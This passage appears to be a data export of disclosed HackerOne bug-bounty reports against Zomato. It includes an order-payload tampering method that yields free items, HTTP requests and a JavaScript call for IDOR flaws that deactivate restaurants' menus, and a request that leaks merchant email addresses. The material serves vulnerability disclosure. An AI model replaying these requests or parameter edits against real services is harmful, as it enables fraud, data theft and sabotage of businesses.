display_cost%22%3A%22%E2%82%B9254.32%22%7D%5D%2C%22dishes%22%3A%5B%7B%22type%22%3A%22dish%22%2C%22comment%22%3A%22%22%2C%22groups%22%3A%5B%5D%2C%22item_id%22%3A390080785%2C%22item_name%22%3A%22Poha%22%2C%22mrp_item%22%3A0%2C%22quantity%22%3A2%2C%22tags%22%3A%221%22%2C%22tax_inclusive%22%3A0%2C%22unit_cost%22%3A59%2C%22total_cost%22%3A118%2C%22is_bogo_active%22%3Afalse%2C%22bogoItemsCount%22%3A0%2C%22alwaysShowOnCheckout%22%3A0%2C%22duration_id%22%3A0%7D%2C%7B%22type%22%3A%22plan%22%2C%22comment%22%3A%22%22%2C%22groups%22%3A%5B%5D%2C%22
item_id%22%3A3%2C%22item_name%22%3A%22Zomato%20Treats%20Membership%22%2C%22mrp_item%22%3A1%2C%22quantity%22%3A1%2C%22tags%22%3A%221%22%2C%22tax_inclusive%22%3A0%2C%22unit_cost%22%3A149%2C%22total_cost%22%3A149%2C%22
is_bogo_active%22%3Afalse%2C%22bogoItemsCount%22%3A0%2C%22alwaysShowOnCheckout%22%3A1%2C%22duration_id%22%3A4%7D%2C%7B%22type%22%3A%22treat_dish%22%2C%22comment%22%3A%22%22%2C%22groups%22%3A%5B%5D%2C%22item_id%22%3A407847609%2C%22item_name%22%3A%22Banana%20Cake%20-%20Treats%22%2C%22mrp_item%22%3A0%2C%22quantity%22%3A1%2C%22tags%22%3A%2220%2C24%22%2C%22tax_inclusive%22%3A0%2C%22unit_cost%22%3A60%2C%22total_cost%22%3A60%2C%22is_bogo_active%22%3Afalse%2C%22bogoItemsCount%22%3A0%2C%22alwaysShowOnCheckout%22%3A1%2C%22duration_id%22%3A0%7D%5D%7D&address_id=██████&phone=█████&phone_country_id=1&name=Russel&special_instructions=&user_forced=0&verify_phone=0&payment_method_id=██████████&payment_method_type=netbanking&card_token=0&card_name=&card_bin=&card_vault=winecellar&recharge=0&recharge_amount=0&recharge_method_type=&additional_recharge=0&additional_recharge_amount=0&voucher_code=&wallet_type=self&dob=&csrfToken=db465772ce05763ac9082da5ec8cef1b&csrft_creation_time=1520220575093


The item id on the separate line is the id corresponding to Zomato Treats with a price of Rs.149. On trying more item_ids, I figured out that there are more order ids for Zomato Treats, and have a price of 0.


I changed the item_id to 18, the unit_cost to 0, and subtracted 149(Zomato Treats Cost) from the total cost. Initial total cost: 254, final total cost: 105.


So ,the new payload becomes:


case=makeonlineorder&res_id=█████&order=██████
TOTAL COST CHANGED to 105
total_cost%22%3A%22105.32%22%2C%22type%22%3A%22total%22%2C%22unit_cost%22%3A0%2C%22quantity%22%3A0%2C%22comment%22%3Anull%2C%22groups%22%3A%5B%5D%2C%22item_id%22%3A0%2C%22mrp_item%22%3A0%2C%22tax_inclusive%22%3A0%2C%22tags%22%3A%22%22%2C%22tax_id%22%3A0%2C%22id%22%3A0%2C%22
display_cost%22%3A%22%E2%82%B9254.32%22%7D%5D%2C%22dishes%22%3A%5B%7B%22type%22%3A%22dish%22%2C%22comment%22%3A%22%22%2C%22groups%22%3A%5B%5D%2C%22item_id%22%3A390080785%2C%22item_name%22%3A%22Poha%22%2C%22mrp_item%22%3A0%2C%22quantity%22%3A2%2C%22tags%22%3A%221%22%2C%22tax_inclusive%22%3A0%2C%22unit_cost%22%3A59%2C%22total_cost%22%3A118%2C%22is_bogo_active%22%3Afalse%2C%22bogoItemsCount%22%3A0%2C%22alwaysShowOnCheckout%22%3A0%2C%22duration_id%22%3A0%7D%2C%7B%22type%22%3A%22plan%22%2C%22comment%22%3A%22%22%2C%22groups%22%3A%5B%5D%2C%22
ITEM Id changed to 18 and total and unit cost changed to 0
item_id%22%3A18%2C%22item_name%22%3A%22Zomato%20Treats%20Membership%22%2C%22mrp_item%22%3A1%2C%22quantity%22%3A1%2C%22tags%22%3A%221%22%2C%22tax_inclusive%22%3A0%2C%22
unit_cost%22%3A0%2C%22total_cost%22%3A0%2C%22
is_bogo_active%22%3Afalse%2C%22bogoItemsCount%22%3A0%2C%22alwaysShowOnCheckout%22%3A1%2C%22duration_id%22%3A4%7D%2C%7B%22type%22%3A%22treat_dish%22%2C%22comment%22%3A%22%22%2C%22groups%22%3A%5B%5D%2C%22item_id%22%3A407847609%2C%22item_name%22%3A%22Banana%20Cake%20-%20Treats%22%2C%22mrp_item%22%3A0%2C%22quantity%22%3A1%2C%22tags%22%3A%2220%2C24%22%2C%22tax_inclusive%22%3A0%2C%22unit_cost%22%3A60%2C%22total_cost%22%3A60%2C%22is_bogo_active%22%3Afalse%2C%22bogoItemsCount%22%3A0%2C%22alwaysShowOnCheckout%22%3A1%2C%22duration_id%22%3A0%7D%5D%7D&address_id=█████████&phone=██████████&phone_country_id=1&name=Russel&special_instructions=&user_forced=0&verify_phone=0&payment_method_id=████&payment_method_type=netbanking&card_token=0&card_name=&card_bin=&card_vault=winecellar&recharge=0&recharge_amount=0&recharge_method_type=&additional_recharge=0&additional_recharge_amount=0&voucher_code=&wallet_type=self&dob=&csrfToken=db465772ce05763ac9082da5ec8cef1b&csrft_creation_time=1520220575093


Complete the transaction and your order will be placed.


PFA the screenshot of the order that shows free banana treats. 


Using this I was not subscribed to Zomato Treats Subscription, but still can get free treats.


Impact
Anyone can order free treats from Zomato.",https://hackerone.com/reports/321938,Haryana,India,Gurugram,2018,3,5,4,54
Zomato,10001,0.0,200m-1b,$100.00,No value,0.0,Insecure Direct Object Reference (IDOR),[www.zomato.com] IDOR - Delete/Deactivate any special menu of any Restaurants from Zomato,"prateek_0490  submitted a report to Zomato.Aug 31st (5 years ago)Summary by prateek_0490Going through the JS, I found another cool function which looked interesting and vulnerable and indeed it was vulnerable -
Code 98 Bytes1{var a={request_type:""deactivate-special-menu"",user_id:USER_ID,menu_set_id:e};$.post(""XXX/XXXXXX)""
It asked for a lot of information, and it required a lots of research/recon to actually achieve this but since after getting a feel for couple of weeks on Zomato's application I found a way to break this feature, I was able to delete/deactivate any/all special menus of any restaurant doesn't matter if I owned that restaurant or not.
I did try out to find a way to figure out the menu_set_id and moreover since I didn't wanted to test on any of @zomato's production users/customers/clients, I also had to find one of the test restaurants owned by Zomato on which I can replicate this, however during testing it was indeed found that there are lot's and lot's of restaurants who have these special menus, this would have lead to delete/deactivate all of them in One Go. I went ahead and deactivated a Special Menu of @zomato's internal testing restaurant_id XXXXXX with menu_set_id"":XXXX which was active till 24th September. I apologised for the same to the team :(
POC

An attacker first needs to figure out these information like user_id, menu_set_id before deactivating any menus. For that we can issue a Post Request with correct var at


Request

Code 196 Bytes1POST /XX/XXXXX?res_id=XXXXX HTTP/1.1
2Host: api.zomato.com
3X-Device-Is-Rooted: 0
4Cookie: <COOKIES>
5Content-Type: application/x-www-form-urlencoded
6
7access_token=<your token>&client_id=zomato_ios_v2


Since there was no restriction or a check to see if we actually hold that restaurant it leaked lots and lot's of useful stuff which was then chained with deleting the special menus of any restaurants.


Now using all this information, an attacker makes a Post Request at -



Request

XXX/XXXXX.php
with var as user_id=XXXX&type=SPECIAL&request_type=get-special-menus&res_id=XXXXX
this gave some more useful information.

Now the final request was made by changing the request_type in the Post Parameters, since I obtained the menu_set_id in our above requests, I made a final request to deactivate/delete that from the restaurants.

In case you have any questions, please feel free to reach me on [Twitter] (https://twitter.com/prateek_0490). :)
Best Regards,
Prateek Tiwari",https://hackerone.com/reports/264919,Haryana,India,Gurugram,2017,8,31,8,20
Zomato,10001,0.0,200m-1b,$200.00,No value,0.0,Insecure Direct Object Reference (IDOR),[www.zomato.com] IDOR - Delete/Deactivate ANY/ALL Promos through a Post Request at **clients/promoDataHandler.php**,prateek_0490  submitted a report to Zomato.Aug 30th (5 years ago),https://hackerone.com/reports/264754,Haryana,India,Gurugram,2017,8,30,17,7
Zomato,10001,0.0,200m-1b,$100.00,Low,2.0,Insecure Direct Object Reference (IDOR),"[www.zomato.com] IDOR - Gold Subscription Details, Able to view ""Membership ID"" and ""Validity Details"" of other Users","riya  submitted a report to Zomato.Apr 28th (5 years ago)Hello Zomato,
The following URL : https://www.zomato.com/gold/payment-success?subscription_id=██████████&user_id=█████████ is vulnerable to IDOR in subscription_id field. Anyone can get Subscription Start & End Date and Plan Duration of a Membership ID just by changing the subscription_id parameter.
{F291153}
MEMBERSHIP ID : ████
STARTED ON : 22 Dec 2017
VALID UP TO : 22 Jun 2018
Subscription Plan :  6 month plan
Impact
Anyone can get Subscription Start & End Date and Plan Duration of a Membership ID.
Cheers!
Riya",https://hackerone.com/reports/344145,Haryana,India,Gurugram,2018,4,28,6,2
Zomato,10001,0.0,200m-1b,$750.00,High,7.5,Insecure Direct Object Reference (IDOR),[www.zomato.com] IDOR - Leaking all Personal Details of all Zomato Users through an endpoint,prateek_0490  submitted a report to Zomato.Sep 20th (5 years ago),https://hackerone.com/reports/269937,Haryana,India,Gurugram,2017,9,20,15,20
Zomato,10001,0.0,200m-1b,$500.00,No value,0.0,Improper Access Control - Generic,[www.zomato.com] Leaking Email Addresses of merchants via reset password feature,"prateek_0490  submitted a report to Zomato.Nov 28th (5 years ago)Hi Team,
Introduction
Found a cool IDOR, which again leaks the email addresses of all Zomato Users. This attack works no matter if you own the restaurant or not.
Proof of Concept

Below Post Request leaks the email addresses of the Restaurant Owners in response -


Request

Code 517 BytesWrap lines Copy Download1POST /php/restaurant_manager_reset_password.php HTTP/1.1
2Host: www.zomato.com
3Connection: close
4Accept: application/json, text/javascript, */*; q=0.01
5X-Requested-With: XMLHttpRequest
6User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36
7Referer: https://www.zomato.com/
8Accept-Encoding: gzip, deflate
9Accept-Language: en-US,en;q=0.9
10Cookie: <Your Cookies HERE>
11Content-Type: application/x-www-form-urlencoded
12Content-Length: 10
13
14res_id=2100935

Response

Code 179 BytesWrap lines Copy Download1{""status"":""success"",""message"":""You will receive a recovery mail at ██████████@gmail.com, if it's in our database. Please check your inbox to start the password recovery process.""}

Now, testing with the restaurants against which I don't own (below snapshot), I purposely first found the restaurant which isn't active then I threw this request at that particular restaurant.

███████

This means, this can help an attacker to extract millions of emails from Zomato's database. This would be a Huge Leak if an attacker gets an access to this POST REQUEST.

Best Regards,
Prateek Tiwari
Impact
Impact
This can allow an attacker to extract all the emails from the Zomato Database. A big leak. And we all know emails are of course the logins as well so this I would categorize as the huge leak considering the nature of the business.shreysinha   posted a comment. Nov 28th (5 years ago)Hi @prateek_0490
We are getting this checked.
Thanks.prateek_0490   posted a comment. Dec 12th (5 years ago)Hi @shreysinha This is still vulnerable :( Any update on this issue? Considering the fact that user info disclosure @zomato cares a lot about this should be resolved by now atleast?
Looking forward to hear from you.
Best Regards,
Prateek Tiwariprateek_0490   posted a comment. Dec 12th (5 years ago)@shreysinha This is fixed now, while testing other issues out on the same endpoint, I now receive 404 Not Found error which means the dev team removed this endpoint itself.
Best Regards,
Prateek Tiwarichicken-tikka   closed the report and changed the status to Resolved. Dec 13th (5 years ago)Zomato  rewarded prateek_0490 with a $500 bounty. Dec 19th (5 years ago)prateek_0490   requested to disclose this report. Feb 11th (2 years ago)Hi Team, It's been quite some time since @zomato has done any public disclosures, thought would request few disclosures. Please see if you can do a full disclosure with some redaction (sensitive stuff if any), else I totally understand :)
Prateekpanipuri Zomato staff  agreed to disclose this report. Feb 18th (2 years ago)  This report has been disclosed. Feb 18th (2 years ago)panipuri Zomato staff  changed the report title from [www.zomato.com] Leaking PIIs (All Email Addresses) Of All Zomato Users to [www.zomato.com] Leaking Email Addresses of merchants via reset password feature. Feb 18th (2 years ago)",https://hackerone.com/reports/293490,Haryana,India,Gurugram,2017,11,28,17,9